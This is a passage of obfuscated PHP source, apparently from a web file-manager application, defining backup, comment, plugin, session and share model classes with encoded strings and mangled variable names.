IO::remove($ìÃÓÇ“¹, !1); return !0; } private function backupPath($òƒÉ×Ñ) { $§ûÎÑ–Ò =& $_SERVER[§Êá¸İ]; $ÕÕ¹¿÷ = $òƒÉ×Ñ[$§ûÎÑ–Ò[32]]; $Äşöğ˜Í = Model($§ûÎÑ–Ò[857])->get($§ûÎÑ–Ò[858]); $ë—«İª­ = substr(md5($§ûÎÑ–Ò[859] . $Äşöğ˜Í . $ÕÕ¹¿÷), 0, 8); return "\x7b\x69\x6f\x3a{$òƒÉ×Ñ[$§ûÎÑ–Ò[839]]}\175\x2f\144\x61\164\141\142\x61\x73\x65\x2f\x62\141\x63\x6b\165\x70\57" . $ÕÕ¹¿÷ . $§ûÎÑ–Ò[11] . $ë—«İª­; } public function start() { $ÜôãŠ” =& $_SERVER[§Êá¸İ]; if ($GLOBALS[$ÜôãŠ”[6]][$ÜôãŠ”[92]][$ÜôãŠ”[2006]] != $ÜôãŠ”[91]) { return !0; } $á”¥¤• = $this->config(); if (!$á”¥¤• || $á”¥¤•[$ÜôãŠ”[1749]] != $ÜôãŠ”[91]) { return !1; } if ($á”¥¤•[$ÜôãŠ”[171]] == $ÜôãŠ”[863]) { $ƒ†Ï¢Ğ¶ = Model($ÜôãŠ”[857])->get($ÜôãŠ”[1334]); if ($ƒ†Ï¢Ğ¶ == $ÜôãŠ”[1335]) { $á”¥¤•[$ÜôãŠ”[171]] = $ÜôãŠ”[1221]; } } $êÒÛğ—Ù = $this->process(); foreach ($êÒÛğ—Ù as $îù£) { if ($îù£) { return Task::restart($îù£[$ÜôãŠ”[483]]); } } $Âò”Êí = new Backup(); $¦óâÌ‘© = $Âò”Êí->db(); if ($¦óâÌ‘©) { $¦óâÌ‘© = $Âò”Êí->dbFile(); if ($¦óâÌ‘© && $á”¥¤•[$ÜôãŠ”[171]] == $ÜôãŠ”[863]) { $¦óâÌ‘© = $Âò”Êí->file(); } } Backup::set(array($ÜôãŠ”[837] => 1, $ÜôãŠ”[848] => time())); return !0; } public function process() { $†…‘¶†Ş =& $_SERVER[§Êá¸İ]; $õÓúü¼ = array($†…‘¶†Ş[844] => Task::get($†…‘¶†Ş[869]), $†…‘¶†Ş[849] => Task::get($†…‘¶†Ş[887]), $†…‘¶†Ş[230] => Task::get($†…‘¶†Ş[896])); $æ›Æ­û = !1; foreach ($õÓúü¼ as &$°òÅÚ¶) { if ($æ›Æ­û) { $°òÅÚ¶ = !1; continue; } if ($°òÅÚ¶) { $†¥·¢ëù = intval(_get($°òÅÚ¶, $†…‘¶†Ş[1784], 0)); if (time() - $†¥·¢ëù > 7200) { Task::kill($°òÅÚ¶[$†…‘¶†Ş[483]]); $æ›Æ­û = !0; $°òÅÚ¶ = !1; } } } return $õÓúü¼; } public function restore() { $óŠ¹–²¡ =& $_SERVER[§Êá¸İ]; ActionCall($óŠ¹–²¡[1148], !0, 1); ActionCall($óŠ¹–²¡[1148], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\x6d\145\x6e\x74"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\x61\155\x65" => "\x63\157\155\155\145\156\x74\137\155\x65\x74\141", "\x6d\145\x74\x61\x46\x69\145\154\x64" => "\x63\x6f\x6d\155\x65\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($“óèÙŞ) { $™œ˜ªá =& $_SERVER[§Êá¸İ]; if ($“óèÙŞ[$™œ˜ªá[2007]]) { $Çãó†‹• = $this->where(array($™œ˜ªá[2008] => $“óèÙŞ[$™œ˜ªá[2007]]))->find(); if (!$Çãó†‹• || $Çãó†‹•[$™œ˜ªá[190]] != $“óèÙŞ[$™œ˜ªá[190]] || $Çãó†‹•[$™œ˜ªá[577]] != $“óèÙŞ[$™œ˜ªá[577]]) { return !1; } $this->where(array($™œ˜ªá[2008] => $“óèÙŞ[$™œ˜ªá[2007]]))->setAdd($™œ˜ªá[2009], 1); } $“óèÙŞ[$™œ˜ªá[2010]] = 0; $“óèÙŞ[$™œ˜ªá[2009]] = 0; $“óèÙŞ[$™œ˜ªá[837]] = 1; return $this->add($“óèÙŞ); } public function commentCount($ØªáÂ°Ü, $²ŒŒÆüó, $åÎ”‹¶‘ = false) { $™±Â¯â¯ =& $_SERVER[§Êá¸İ]; if (!$ØªáÂ°Ü) { return array(); } if (is_string($ØªáÂ°Ü) || is_int($ØªáÂ°Ü)) { $ØªáÂ°Ü = array($ØªáÂ°Ü); } $¯¾˜Šîá = array($™±Â¯â¯[577], $™±Â¯â¯[2011] => $™±Â¯â¯[573]); $ˆå³™õ— = array($™±Â¯â¯[577] => array($™±Â¯â¯[7], $ØªáÂ°Ü), $™±Â¯â¯[190] => $²ŒŒÆüó); if ($åÎ”‹¶‘) { $ˆå³™õ—[$™±Â¯â¯[1779]] = $åÎ”‹¶‘; } $·ä­¯µ = $this->field($¯¾˜Šîá)->where($ˆå³™õ—)->group($™±Â¯â¯[577])->select(); return array_to_keyvalue($·ä­¯µ, $™±Â¯â¯[577], $™±Â¯â¯[573]); } public function starTarget($Ï©–’ûÚ, $ÃâŞâõ») { $•¯âÆôÚ =& $_SERVER[§Êá¸İ]; $²İÍÈ‹ç = $Ï©–’ûÚ + self::TYPE_STAR_OFFSET; $Ï¥Êâ‚é = array($•¯âÆôÚ[1779] => USER_ID, $•¯âÆôÚ[190] => $²İÍÈ‹ç, $•¯âÆôÚ[577] => $ÃâŞâõ»); $¦çø§îœ = $this->where($Ï¥Êâ‚é)->find(); if ($¦çø§îœ) { return $this->where(array($•¯âÆôÚ[483] => $¦çø§îœ[$•¯âÆôÚ[483]]))->delete(); } $ş´ØÂ¦È = array($•¯âÆôÚ[2007] => 0, $•¯âÆôÚ[1779] => USER_ID, $•¯âÆôÚ[837] => 1, $•¯âÆôÚ[171] => $•¯âÆôÚ[12], $•¯âÆôÚ[190] => $²İÍÈ‹ç, $•¯âÆôÚ[577] => $ÃâŞâõ», $•¯âÆôÚ[2010] => 0, $•¯âÆôÚ[2009] => 0); return $this->add($ş´ØÂ¦È); } public function starTargetCount($˜ñªõÌñ, $…€î›¼à) { $«Ò¡ÀÆ =& $_SERVER[§Êá¸İ]; $¡•İ“Ú› = $…€î›¼à + self::TYPE_STAR_OFFSET; $Ü¤ñ¼ë = $this->commentCount($˜ñªõÌñ, $¡•İ“Ú›); $Á…Ì¹Éñ = $this->commentCount($˜ñªõÌñ, $¡•İ“Ú›, USER_ID); return array($«Ò¡ÀÆ[2012] => $Ü¤ñ¼ë, $«Ò¡ÀÆ[2013] => $Á…Ì¹Éñ); } public function starTargetUserList($Û½—ï ¬, $ŞíÕò) { $ŸÉ“í÷ =& $_SERVER[§Êá¸İ]; $ÎÅ÷Û› = $Û½—ï ¬ + self::TYPE_STAR_OFFSET; $Á•ÊÏàÃ = array($ŸÉ“í÷[577] => $ŞíÕò, $ŸÉ“í÷[190] => $ÎÅ÷Û›); $¬Ñ‡Ü¡ = $this->where($Á•ÊÏàÃ)->count(); $–ĞîááŸ = array($ŸÉ“í÷[332] => $¬Ñ‡Ü¡, $ŸÉ“í÷[2014] => array()); if (!$¬Ñ‡Ü¡) { return $–ĞîááŸ; } $ªàÎÒ„ = $this->field($ŸÉ“í÷[1779])->where($Á•ÊÏàÃ)->limit(500)->select(); $ªàÎÒ„ = array_to_keyvalue($ªàÎÒ„, $ŸÉ“í÷[12], $ŸÉ“í÷[1779]); $–ĞîááŸ[$ŸÉ“í÷[2014]] = Model($ŸÉ“í÷[585])->userListInfo($ªàÎÒ„); return $–ĞîááŸ; } public function prasiseUserList($°˜„şË¸) { $‘­®Å¡¿ =& $_SERVER[§Êá¸İ]; $­­á¬…ç = array($‘­®Å¡¿[2015] => $°˜„şË¸); $ú¾‹Á€ = $this->where($­­á¬…ç)->find(); $³Ñç¾É = _get($ú¾‹Á€, $‘­®Å¡¿[2010], 0); $§Óøíë¨ = array($‘­®Å¡¿[332] => $³Ñç¾É, $‘­®Å¡¿[2014] => array()); if (!$³Ñç¾É) { return $§Óøíë¨; } $ÂÜ‚°á¸ = Model($‘­®Å¡¿[2016])->field($‘­®Å¡¿[1779])->where($­­á¬…ç)->limit(500)->select(); $ÂÜ‚°á¸ = array_to_keyvalue($ÂÜ‚°á¸, $‘­®Å¡¿[12], $‘­®Å¡¿[1779]); $§Óøíë¨[$‘­®Å¡¿[2014]] = Model($‘­®Å¡¿[585])->userListInfo($ÂÜ‚°á¸); return $§Óøíë¨; } public function remove($…ºÊ™Óã) { $ˆœºÌÔ› =& $_SERVER[§Êá¸İ]; $ğõ†õÖˆ = array($ˆœºÌÔ›[2008] => $…ºÊ™Óã); $âä®œŸª = $this->where($ğõ†õÖˆ)->find(); if ($âä®œŸª[$ˆœºÌÔ›[2007]]) { $this->where(array($ˆœºÌÔ›[2008] => $âä®œŸª[$ˆœºÌÔ›[2007]]))->setAdd($ˆœºÌÔ›[2009], -1); } return $this->where($ğõ†õÖˆ)->delete(); } public function edit($ì‘óË¬, $æÌ›çÑ) { $†·­Œ›ß =& $_SERVER[§Êá¸İ]; $¯ øıÄş = array($†·­Œ›ß[2008] => $ì‘óË¬); return $this->where($¯ øıÄş)->save(array($†·­Œ›ß[2017] => $æÌ›çÑ)); } public function prasise($ï†ô’ãş) { $ÜÉÏıé¼ =& $_SERVER[§Êá¸İ]; $íÀñÂ‘ = Model($ÜÉÏıé¼[2018]); $‡ŞîüÄæ = array($ÜÉÏıé¼[2008] => $ï†ô’ãş, $ÜÉÏıé¼[1770] => USER_ID); $Í’Ç¡ÛÑ = $íÀñÂ‘->where($‡ŞîüÄæ)->find(); if (!$Í’Ç¡ÛÑ) { $íÀñÂ‘->add($‡ŞîüÄæ); $…æâ·À = $this->where(array($ÜÉÏıé¼[2008] => $ï†ô’ãş))->setAdd($ÜÉÏıé¼[2010], 1); } else { $íÀñÂ‘->where($‡ŞîüÄæ)->delete(); $…æâ·À = $this->where(array($ÜÉÏıé¼[2008] => $ï†ô’ãş))->setAdd($ÜÉÏıé¼[2010], -1); } return $…æâ·À; } public function targetInfo($€±õ›À§, $Ïø™™µë) { $€ò§»’ =& $_SERVER[§Êá¸İ]; $È”œ‹æ“ = array($€ò§»’[656] => $€±õ›À§, $€ò§»’[657] => $Ïø™™µë); $µ»ã£„æ = $this->where($È”œ‹æ“)->count(); $Å ”ûÑ’ = "\122\111\x47\x48\124\40\x4a\117\x49\116\x20{$this->tablePrefix}\143\x6f\x6d\x6d\145\x6e\164\137\x70\x72\x61\x69\x73\x65\40\163\x74\x61\x72\40\x6f\156\x20\x63\157\x6d\155\145\x6e\164\x2e\143\157\x6d\155\145\156\x74\x49\x44\40\75\40\x73\164\x61\x72\x2e\143\x6f\155\x6d\145\156\x74\111\104"; $üı©¢ø = $this->alias($€ò§»’[430])->where($È”œ‹æ“)->join($Å ”ûÑ’, $€ò§»’[2019])->count(); $ì¥ÂÃÍò = array($€ò§»’[2020] => $µ»ã£„æ, $€ò§»’[2021] => $üı©¢ø); return $ì¥ÂÃÍò; } public function listData($Üù•º’) { $ƒâö÷²› =& $_SERVER[§Êá¸İ]; if (isset($Üù•º’[$ƒâö÷²›[2022]])) { if ($Üù•º’[$ƒâö÷²›[2022]]) { $Üù•º’[$ƒâö÷²›[2015]] = array($ƒâö÷²›[1102], intval($Üù•º’[$ƒâö÷²›[2022]])); } unset($Üù•º’[$ƒâö÷²›[2022]]); } if (isset($Üù•º’[$ƒâö÷²›[2023]])) { if ($Üù•º’[$ƒâö÷²›[2023]]) { $Üù•º’[$ƒâö÷²›[2015]] = array($ƒâö÷²›[1099], intval($Üù•º’[$ƒâö÷²›[2023]])); } unset($Üù•º’[$ƒâö÷²›[2023]]); } return $this->_listData($Üù•º’); } private function _listData($Ãó«Ê¬¹) { $¶î˜‘¥• =& $_SERVER[§Êá¸İ]; $Ù¼ë·Ç = $this->where($Ãó«Ê¬¹)->_makeOrder()->selectPage(100); $this->_listAppendParent($Ù¼ë·Ç[$¶î˜‘¥•[445]]); $this->_listAppendUser($Ù¼ë·Ç[$¶î˜‘¥•[445]]); $this->_listAppendMeta($Ù¼ë·Ç[$¶î˜‘¥•[445]]); return $Ù¼ë·Ç; } private function _makeOrder() { $¶™¯½ÔŞ =& $_SERVER[§Êá¸İ]; $¦€Œ‡“² = array($¶™¯½ÔŞ[2010], $¶™¯½ÔŞ[2009], $¶™¯½ÔŞ[231]); $õ…‹êùç = Input::get($¶™¯½ÔŞ[538], $¶™¯½ÔŞ[7], $¶™¯½ÔŞ[505], $¦€Œ‡“²); $ü¥œœ­÷ = Input::get($¶™¯½ÔŞ[539], $¶™¯½ÔŞ[7], $¶™¯½ÔŞ[1772], array($¶™¯½ÔŞ[2024], $¶™¯½ÔŞ[534])); $Æ’¦·­¥ = $õ…‹êùç . $¶™¯½ÔŞ[53] . $ü¥œœ­÷; return $this->order($Æ’¦·­¥); } private function _listAppendParent(&$†Ûãµë) { $ü´½Š“ =& $_SERVER[§Êá¸İ]; $÷²²¶ = array_unique(array_to_keyvalue($†Ûãµë, $ü´½Š“[12], $ü´½Š“[2007])); $÷²²¶ = array_remove_value($÷²²¶, $ü´½Š“[228]); if (!$÷²²¶) { return; } $°æß¯–í = $this->where(array($ü´½Š“[2008] => array($ü´½Š“[7], $÷²²¶)))->select(); $°æß¯–í = array_to_keyvalue($°æß¯–í, $ü´½Š“[2015]); foreach ($†Ûãµë as &$ˆ©Á§²Ã) { if (isset($°æß¯–í[$ˆ©Á§²Ã[$ü´½Š“[2007]]])) { $ˆ©Á§²Ã[$ü´½Š“[2025]] = $°æß¯–í[$ˆ©Á§²Ã[$ü´½Š“[2007]]]; } } unset($ˆ©Á§²Ã); } private function _listAppendUser(&$¥†š€Ú) { $ÅÀá˜Á™ =& $_SERVER[§Êá¸İ]; $Ê€şà‹Æ = array_unique(array_to_keyvalue($¥†š€Ú, $ÅÀá˜Á™[12], $ÅÀá˜Á™[1779])); $Ê€şà‹Æ = array_remove_value($Ê€şà‹Æ, $ÅÀá˜Á™[228]); if (count($Ê€şà‹Æ) == 0) { return; } foreach ($¥†š€Ú as $ ·É³üï) { if (isset($ ·É³üï[$ÅÀá˜Á™[2025]])) { $Ê€şà‹Æ[] = $ ·É³üï[$ÅÀá˜Á™[2025]][$ÅÀá˜Á™[1779]]; } } $«èü£Â = Model($ÅÀá˜Á™[606])->userListInfo($Ê€şà‹Æ); foreach ($¥†š€Ú as &$ ·É³üï) { $ ·É³üï[$ÅÀá˜Á™[670]] = $«èü£Â[$ ·É³üï[$ÅÀá˜Á™[1779]]]; if (isset($ ·É³üï[$ÅÀá˜Á™[2025]])) { $ ·É³üï[$ÅÀá˜Á™[2025]][$ÅÀá˜Á™[670]] = $«èü£Â[$ ·É³üï[$ÅÀá˜Á™[2025]][$ÅÀá˜Á™[1779]]]; } } unset($ ·É³üï); } private function _listAppendMeta(&$á­¹°¯ü) { $íüï§µ™ =& $_SERVER[§Êá¸İ]; $ñÙµ·¾° = array_unique(array_to_keyvalue($á­¹°¯ü, $íüï§µ™[12], $íüï§µ™[2015])); $ñÙµ·¾° = array_remove_value($ñÙµ·¾°, $íüï§µ™[228]); if (!$ñÙµ·¾°) { return; } foreach ($á­¹°¯ü as $•ˆƒ‹Æ½) { if (isset($•ˆƒ‹Æ½[$íüï§µ™[2025]])) { $ñÙµ·¾°[] = $•ˆƒ‹Æ½[$íüï§µ™[2025]][$íüï§µ™[2015]]; } } $·„ûÁˆå = $this->metaList($ñÙµ·¾°); if (!$·„ûÁˆå) { return !1; } foreach ($á­¹°¯ü as &$•ˆƒ‹Æ½) { $•ˆƒ‹Æ½[$íüï§µ™[547]] = $·„ûÁˆå[$•ˆƒ‹Æ½[$íüï§µ™[2015]]]; if (isset($•ˆƒ‹Æ½[$íüï§µ™[2025]])) { $•ˆƒ‹Æ½[$íüï§µ™[2025]][$íüï§µ™[547]] = $·„ûÁˆå[$•ˆƒ‹Æ½[$íüï§µ™[2025]][$íüï§µ™[2015]]]; } } unset($•ˆƒ‹Æ½); } private function metaList($ù¿ÙĞÑÄ) { $£ÜŠ÷æ— =& $_SERVER[§Êá¸İ]; if (!$ù¿ÙĞÑÄ) { return array(); } $„“¯¯ıÁ = array($£ÜŠ÷æ—[2015] => array($£ÜŠ÷æ—[7], $ù¿ÙĞÑÄ)); $ÈŠÚÚñ¸ = Model($£ÜŠ÷æ—[2026])->where($„“¯¯ıÁ)->select(); $ÈŠÚÚñ¸ = array_to_keyvalue_group($ÈŠÚÚñ¸, $£ÜŠ÷æ—[2015]); foreach ($ÈŠÚÚñ¸ as $µÅş‘»² => $ùó«å‚Æ) { $•°‹¸•Ş = array(); foreach ($ùó«å‚Æ as $Î¸êÛ¬ª) { $•°‹¸•Ş[$Î¸êÛ¬ª[$£ÜŠ÷æ—[97]]] = $Î¸êÛ¬ª[$£ÜŠ÷æ—[450]]; } $ÈŠÚÚñ¸[$µÅş‘»²] = $•°‹¸•Ş; } return $ÈŠÚÚñ¸ ? $ÈŠÚÚñ¸ : array(); } public function removeTarget($ôòÈĞ½Á, $êÏÄñ¸) { $åÀ¯æ… =& $_SERVER[§Êá¸İ]; if (!$êÏÄñ¸) { return !0; } $êÏÄñ¸ = is_array($êÏÄñ¸) ? $êÏÄñ¸ : array($êÏÄñ¸); $Şæš¬Ä× = array($åÀ¯æ…[190] => $ôòÈĞ½Á, $åÀ¯æ…[577] => array($åÀ¯æ…[7], $êÏÄñ¸)); $…¶Èîì = $this->field($åÀ¯æ…[2015])->where($Şæš¬Ä×)->select(); $áãâøÓ = array_to_keyvalue($…¶Èîì, $åÀ¯æ…[12], $åÀ¯æ…[2015]); if (!$áãâøÓ) { return !0; } $Şæš¬Ä× = array($åÀ¯æ…[2015] => array($åÀ¯æ…[7], $áãâøÓ)); $this->where($Şæš¬Ä×)->delete(); Model($åÀ¯æ…[2018])->where($Şæš¬Ä×)->delete(); Model($åÀ¯æ…[2027])->where($Şæš¬Ä×)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\146\151\x6c\145\137\x63\157\156\164\145\x6e\164\163"; protected $dataAuto = array(array("\143\162\145\x61\164\x65\x54\x69\x6d\145", "\164\151\155\x65", "\x69\x6e\163\145\162\164", "\146\x75\x6e\x63\x74\151\x6f\x6e")); } goto B§ø²¥¸¶‰; cÒî•Ãµµê: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\160\x6c\x75\x67\x69\x6e\114\151\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\x73\164\x61\164\x75\163", "\162\x65\147\x69\145\x73\x74", "\x63\157\x6e\x66\x69\x67"); public function loadList($–íßçü = false) { $¾ú·•Àâ = array_to_keyvalue($this->listData(), $_SERVER[§Êá¸İ][32]); if ($–íßçü) { return $¾ú·•Àâ[$–íßçü]; } return $¾ú·•Àâ; } public function init() { $Òº”¡˜À =& $_SERVER[§Êá¸İ]; Hook::trigger($Òº”¡˜À[2102]); $´§Í÷² = $this->loadPluginList(); foreach ($´§Í÷² as $„ìŞŸÁ => $¡İõ•î») { $–Ë•ƒßã = $this->appAllow($„ìŞŸÁ, $¡İõ•î»); if (!$–Ë•ƒßã) { continue; } foreach ($¡İõ•î»[$Òº”¡˜À[2103]] as $ıÚ…–ˆ• => $ ´ˆª) { Hook::bind($ıÚ…–ˆ•, $ ´ˆª); } } Hook::trigger($Òº”¡˜À[2104]); Hook::trigger(ACTION); } public function appAllow($ÒÃ÷…áî, $´œ¾šŸ, $òà™× ² = true) { $œı’¬Îå =& $_SERVER[§Êá¸İ]; $ü¥›î¼ = PLUGIN_DIR . $ÒÃ÷…áî . $œı’¬Îå[2105]; if (!is_array($´œ¾šŸ) || !is_array($´œ¾šŸ[$œı’¬Îå[2103]]) || $´œ¾šŸ[$œı’¬Îå[837]] != 1 || !is_file($ü¥›î¼)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$œı’¬Îå[6]][$œı’¬Îå[2106]] || !$GLOBALS[$œı’¬Îå[6]][$œı’¬Îå[2107]]) { return !0; } $­ÆïÜ­ = explode($œı’¬Îå[50], strtolower($GLOBALS[$œı’¬Îå[6]][$œı’¬Îå[2107]])); return in_array(strtolower($ÒÃ÷…áî), $­ÆïÜ­) ? !1 : !0; } if ($òà™× ² && !Action($œı’¬Îå[2108])->checkAuth($ÒÃ÷…áî)) { return !1; } return !0; } public function unInstall($ø¾‚¶”ü) { $ªÏÓ×œë =& $_SERVER[§Êá¸İ]; $Ïä²ó³Á = $this->loadList($ø¾‚¶”ü); if (file_exists(PLUGIN_DIR . $ø¾‚¶”ü)) { Hook::apply($ø¾‚¶”ü . $ªÏÓ×œë[2109]); } $this->remove($Ïä²ó³Á[$ªÏÓ×œë[483]]); } public function changeStatus($³ÌûşöÎ, $¥îËªéÏ) { $ë¶Œúğ =& $_SERVER[§Êá¸İ]; $ùØºã°è = $this->loadList($³ÌûşöÎ); if ($¥îËªéÏ) { Hook::apply($³ÌûşöÎ . $ë¶Œúğ[2110]); } $this->update($ùØºã°è[$ë¶Œúğ[483]], array($ë¶Œúğ[2111] => $¥îËªéÏ)); } public function appRegist($³şÚ€İÃ, $¸¬ŸĞ£Ô) { $†ù¼ü”‰ =& $_SERVER[§Êá¸İ]; $¯Õ¸Ñ½Ğ = $this->loadList($³şÚ€İÃ); if ($¯Õ¸Ñ½Ğ) { $this->update($¯Õ¸Ñ½Ğ[$†ù¼ü”‰[483]], array($†ù¼ü”‰[2103] => $¸¬ŸĞ£Ô)); } else { $ Â¾ó´÷ = array($†ù¼ü”‰[32] => $³şÚ€İÃ, $†ù¼ü”‰[2103] => $¸¬ŸĞ£Ô, $†ù¼ü”‰[837] => 0, $†ù¼ü”‰[6] => $this->getConfigDefault($³şÚ€İÃ)); $this->insert($ Â¾ó´÷); } } public function getConfigDefault($ ‘ş»·Ñ) { $ÈºÎ–Ûš =& $_SERVER[§Êá¸İ]; $Š³°ª©´ = array(); $ø“Éã™Ü = $this->getPackageJson($ ‘ş»·Ñ); if (!$ø“Éã™Ü && is_array($ø“Éã™Ü[$ÈºÎ–Ûš[2112]])) { return $Š³°ª©´; } foreach ($ø“Éã™Ü[$ÈºÎ–Ûš[2112]] as $šÀåš«À => $»Å…èªë) { if (!isset($»Å…èªë[$ÈºÎ–Ûš[450]]) || isset($Š³°ª©´[$šÀåš«À])) { continue; } $Š³°ª©´[$šÀåš«À] = $»Å…èªë[$ÈºÎ–Ûš[450]]; } return $Š³°ª©´; } public function getPackageJson($”±«Ûïû) { return Hook::apply($”±«Ûïû . $_SERVER[§Êá¸İ][2113]); } public function getConfig($œ™Øİ­¢, $‚®¨§Î¢ = false) { $©®±Š»â =& $_SERVER[§Êá¸İ]; $ÍàÊ‡®² = array(); $¬©´»è¼ = $this->loadList($œ™Øİ­¢); if ($¬©´»è¼ && is_array($¬©´»è¼[$©®±Š»â[6]])) { $ÍàÊ‡®² = $¬©´»è¼[$©®±Š»â[6]]; } if (!$ÍàÊ‡®² || $‚®¨§Î¢) { $ÍàÊ‡®² = $this->getConfigDefault($œ™Øİ­¢); } return $ÍàÊ‡®²; } public function setConfig($Î„¾³ß, $ñ´ö†Ö = false) { $±¡­Í³¼ =& $_SERVER[§Êá¸İ]; $š•ãÒş = $this->loadList($Î„¾³ß); if (!$š•ãÒş) { return !1; } $³ü„£÷¾ = $š•ãÒş[$±¡­Í³¼[6]]; if ($ñ´ö†Ö == !1) { $³ü„£÷¾ = array(); $ñ´ö†Ö = $this->getConfigDefault($Î„¾³ß); } foreach ($ñ´ö†Ö as $£Š›•òÂ => $á»ã­) { $³ü„£÷¾[$£Š›•òÂ] = is_string($á»ã­) ? trim($á»ã­) : $á»ã­; } $this->update($š•ãÒş[$±¡­Í³¼[483]], array($±¡­Í³¼[6] => $³ü„£÷¾)); } public function viewList() { $ÃÂ›Õã¦ =& $_SERVER[§Êá¸İ]; $İÁÑ©± = $this->loadList(); $this->pluginScan($İÁÑ©±); $İÁÑ©± = $this->loadPluginList(); $èÏ±§¶Á = array(); foreach ($İÁÑ©± as $¼±ü‘úÊ => $Ó¸å‡ß°) { $Æô² ù = $Ó¸å‡ß°; unset($Ó¸å‡ß°[$ÃÂ›Õã¦[2103]], $Ó¸å‡ß°[$ÃÂ›Õã¦[6]]); $Õ¤ŠÃ€ = PLUGIN_DIR . $Ó¸å‡ß°[$ÃÂ›Õã¦[32]] . $ÃÂ›Õã¦[2105]; if (!is_file($Õ¤ŠÃ€)) { continue; } $¤òÙÀâë = Hook::apply($Ó¸å‡ß°[$ÃÂ›Õã¦[32]] . $ÃÂ›Õã¦[2113]); if (!is_array($¤òÙÀâë)) { continue; } $èÏ±§¶Á[$¼±ü‘úÊ] = array_merge($Ó¸å‡ß°, $¤òÙÀâë); if ($Æô² ù[$ÃÂ›Õã¦[6]][$ÃÂ›Õã¦[1693]] != $¤òÙÀâë[$ÃÂ›Õã¦[1667]]) { Hook::apply($Ó¸å‡ß°[$ÃÂ›Õã¦[32]] . $ÃÂ›Õã¦[2110]); $Æô² ù[$ÃÂ›Õã¦[6]][$ÃÂ›Õã¦[1693]] = $¤òÙÀâë[$ÃÂ›Õã¦[1667]]; $this->update($Ó¸å‡ß°[$ÃÂ›Õã¦[483]], array($ÃÂ›Õã¦[6] => $Æô² ù[$ÃÂ›Õã¦[6]])); } } return $èÏ±§¶Á; } private function loadPluginList() { $±ô˜Ú€ =& $_SERVER[§Êá¸İ]; $•›…Èş = $this->loadList(); if (strtolower(MOD) == $±ô˜Ú€[2114]) { return $•›…Èş; } $–“¬ÃìÔ = Hook::trigger($±ô˜Ú€[2115], $•›…Èş); if ($•›…Èş && !$–“¬ÃìÔ) { die; } return $–“¬ÃìÔ ? $–“¬ÃìÔ : $•›…Èş; } private function pluginScan($®³Ê ‡§) { $»ê ú¡– =& $_SERVER[§Êá¸İ]; recursion_dir(PLUGIN_DIR, $º¾¸“øğ, $ÉÁ•‚, 0); foreach ($º¾¸“øğ as $½úÂ—‚¨) { $š”ö‰… = get_path_this($½úÂ—‚¨); if (isset($®³Ê ‡§[$š”ö‰…]) || !file_exists($½úÂ—‚¨ . $»ê ú¡–[2116]) || !file_exists($½úÂ—‚¨ . $»ê ú¡–[2105])) { continue; } Hook::apply($š”ö‰… . $»ê ú¡–[2110]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\x65\155\x5f\163\x65\x73\x73\151\x6f\156"; public function get($½Í÷ƒù) { $§İóÏÀ“ =& $_SERVER[§Êá¸İ]; $ÅÏ™·¦” = $this->where(array($§İóÏÀ“[2117] => $½Í÷ƒù))->find(); if (!is_array($ÅÏ™·¦”)) { return !1; } return $ÅÏ™·¦”[$§İóÏÀ“[171]]; } public function set($Á›À…¦Ö, $¾ˆš¯Ÿ, $ØÁ¬ã¹‚ = 3600) { $ô êÍã¿ =& $_SERVER[§Êá¸İ]; $Şí Šò = array($ô êÍã¿[2117] => $Á›À…¦Ö, $ô êÍã¿[2017] => $¾ˆš¯Ÿ, $ô êÍã¿[2118] => $ØÁ¬ã¹‚ + time()); if (Session::get($ô êÍã¿[2119])) { $Şí Šò[$ô êÍã¿[1779]] = Session::get($ô êÍã¿[2119]); } else { $Şí Šò[$ô êÍã¿[1779]] = 0; } if ($this->get($Á›À…¦Ö)) { return $this->where(array($ô êÍã¿[2117] => $Á›À…¦Ö))->save($Şí Šò); } else { return $this->add($Şí Šò, array(), !0); } } public function remove($’¸¬åË©) { return $this->where(array($_SERVER[§Êá¸İ][2117] => $’¸¬åË©))->delete(); } public function clearTimeout() { return $this->where($_SERVER[§Êá¸İ][2120] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\x72\x65"; protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\124\x69\155\x65", "\x74\151\155\145", "\x69\156\x73\x65\162\164\54\165\160\x64\x61\164\145", "\146\165\156\143\x74\x69\157\156"), array("\x63\x72\145\141\x74\145\x54\x69\155\145", "\x74\x69\155\x65", "\x69\x6e\x73\145\162\x74", "\146\165\x6e\143\164\x69\157\156"), array("\x6f\160\164\151\x6f\x6e\x73", '', "\x69\x6e\x73\x65\x72\164\x2c\x75\160\144\x61\x74\x65\x2c\x73\x65\154\145\143\x74", "\x6a\163\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ÄûÚ©œ‡) { $èÎ¼Íó„ =& $_SERVER[§Êá¸İ]; $›°ÍÖ¥æ = isset($ÄûÚ©œ‡[0]) ? $ÄûÚ©œ‡[0] : !1; return array($èÎ¼Íó„[2121] => array(USER_ID, $èÎ¼Íó„[2122]), $èÎ¼Íó„[2062] => array($›°ÍÖ¥æ, $èÎ¼Íó„[2123])); } protected function listSimple() { $äùâùËš = array($_SERVER[§Êá¸İ][1779] => USER_ID); $á„‘ŒÊ = $this->field($this->fieldList)->where($äùâùËš)->select(); return $á„‘ŒÊ ? $á„‘ŒÊ : array(); } protected function getInfo($Õ¨ãŒÕ™, $Õ¨‡Ú€‰ = false) { $ÜÌ§Š ì =& $_SERVER[§Êá¸İ]; if ($Õ¨‡Ú€‰) { return $this->_getShareInfo(array($ÜÌ§Š ì[673] => $Õ¨ãŒÕ™)); } $˜ê´“÷Ú = $this->cacheFunctionGet($ÜÌ§Š ì[2064], $Õ¨ãŒÕ™); return $˜ê´“÷Ú; } public function getInfoByHash($µÀÌÇ¢°) { return $this->_getShareInfo(array($_SERVER[§Êá¸İ][2124] => 